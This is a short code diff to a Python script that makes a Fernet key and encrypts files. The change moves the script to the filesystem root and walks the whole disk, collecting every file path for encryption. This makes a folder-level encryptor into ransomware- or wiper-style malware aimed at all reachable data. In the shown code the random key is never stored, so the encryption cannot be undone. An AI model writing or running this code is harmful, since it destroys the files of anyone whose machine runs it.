@@ -9,8 +9,18 @@ from cryptography.fernet import Fernet
 # Generate new fernet key:
 key = Fernet(Fernet.generate_key())
 
+# Go to Home:
+try:
+    os.chdir('../../../../../../../../../../../../../')
+except Exception as error:
+    print(error)
+
 # List files:
-files = os.listdir()
+files = []
+for dirpath, dirs, files_in_dir in os.walk(os.getcwd()):
+    for f in files_in_dir:
+        absolute_path = os.path.abspath(os.path.join(dirpath, f))
+        files.append(absolute_path)
 
 # Encrypt files:
 for file in files:
@@ -47,4 +57,3 @@ for file in files:
     except Exception as error:
         print(error)
         continue
-
